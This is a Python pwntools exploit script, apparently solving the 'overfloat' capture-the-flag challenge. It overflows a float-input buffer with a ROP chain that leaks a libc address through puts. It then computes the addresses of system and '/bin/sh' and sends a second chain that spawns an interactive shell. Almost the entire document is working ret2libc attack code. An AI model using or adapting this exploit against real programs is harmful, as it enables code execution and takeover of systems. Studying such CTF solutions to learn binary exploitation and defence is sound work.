from pwn import * 


target = process("./overfloat")
#target = gdb.debug("./overfloat","b * (main + 134)")
#gdb.attach(target, )

def float_to_ieee(value):
	mant = 0x007fffff & value
	exp = (0x7f800000 & value) >> 23
	#print(hex(exp))
	sign1 = 0x80000000 & value
	expon = 2 ** (exp - 127)
	#print(expon)
	dec = 0.0
	for i in range(23):
		x = 0x400000 & mant
		mant = mant << 1
		thing = x >> (22 - i) 
		if( thing != 0):
			cloat = 2.0 ** -float(i)
		else:
			continue
		
		dec += cloat
		
	dec *=  expon 
	#print('{0:.20}'.format(dec))
	return '{0:.20}'.format(dec)

		
printf= 0x004006c0
exploit = 0x70243525
exits = 0x0400720
puts =    0x0400690
puts_plt = 0x00000000004008d0
puts_got = 0x0000000000602020
where_long = 0x00400ad4
pop_rdi = 0x0000000000400a83
main = 0x00400993
for i in range(14): 
	target.sendline(b"1")


def add_ROP(address):
	x = (address & 0xffffffff00000000) >> 16
	y = address & 0xffffffff
	
	floatx = float_to_ieee(x)
	floaty = float_to_ieee(y)	
	

	target.sendline(floaty.encode())

	target.sendline(floatx.encode())
 
add_ROP(pop_rdi)
#add_ROP(exploit)
add_ROP(puts_got)
add_ROP(puts)
add_ROP(main)

uf = lambda x: struct.unpack('f', x)[0]

target.sendline(b"done")

target.recvuntil(b"VOYAGE!\n")
leak = int.from_bytes(target.recvn(6)[::-1])
print(hex(leak))
bin_sh = leak + 0x14384f

print("bin_sh: " + hex(bin_sh))
system = leak - 0x2f490
print("system: " + hex(system))

for i in range(14): 
	target.sendline(b"1")

add_ROP(pop_rdi)
target.sendline(str(uf(p32(bin_sh & 0xffffffff))).encode())
target.sendline(str((uf(p64((bin_sh & 0xffffffff00000000))[4:]))).encode())

add_ROP(0x0000000000400661)
target.sendline(str(uf(p32(system & 0xffffffff))).encode())

target.sendline(str(uf(p64((system & 0xffffffff00000000))[4:])).encode())

#add_ROP(bin_sh)
#add_ROP(system)



target.sendline(b"done")


target.interactive()



